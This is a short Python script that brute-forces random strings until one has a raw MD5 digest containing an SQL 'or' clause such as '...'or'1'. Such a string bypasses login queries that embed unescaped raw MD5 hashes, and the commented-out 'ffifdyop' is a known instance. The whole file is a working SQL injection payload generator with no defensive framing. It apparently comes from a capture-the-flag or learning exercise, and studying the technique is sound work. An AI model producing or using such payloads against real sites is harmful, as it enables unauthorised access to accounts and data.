#generate random strings from len 10-32 against a regex

from pymd5 import md5
import random
import re

def main():
    choices = "abcdefghijklmnopqrstuvwxyz0123456789"
    integers = "123456789"
    regex = ".*\'((or)|(\|\|))\'[1-9]"
    random.seed()
    #inputTest = "9fcef3897afe2acc3e7438ce14f5b6a3"
    #inputTest = "ffifdyop"
    while True:
        inputTest = ''.join((random.choice(choices)) for i in range (random.randint(10,32)))
        h = md5()
        h.update(inputTest)
        d = str(h.digest())
        if re.search( regex, d, re.I | re.S ):
            print ("Input string is: " + inputTest)
            print ("Output digest is: " + d)
            break
        print inputTest
        

            

if __name__=='__main__':
    main()
